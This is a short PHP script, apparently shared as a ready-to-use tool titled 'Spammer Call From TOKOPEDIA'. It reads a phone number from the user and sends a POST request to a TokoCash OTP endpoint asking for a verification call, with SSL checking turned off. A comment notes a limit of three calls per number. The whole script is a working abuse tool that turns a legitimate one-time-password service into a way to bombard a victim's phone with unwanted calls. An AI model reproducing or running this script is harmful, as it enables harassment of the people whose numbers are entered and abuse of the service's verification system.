<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
############################################################
    Spammer Call From TOKOPEDIA
        Author By   : Mr_Vektor04
        Support     : my friends
        Website     : https://rava04.blogspot.com
        Intagram    : @rava_art_story
     Penggunaannya  : Bisa Menggunakan [08/62]
###########################################################\n";
echo "Nomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
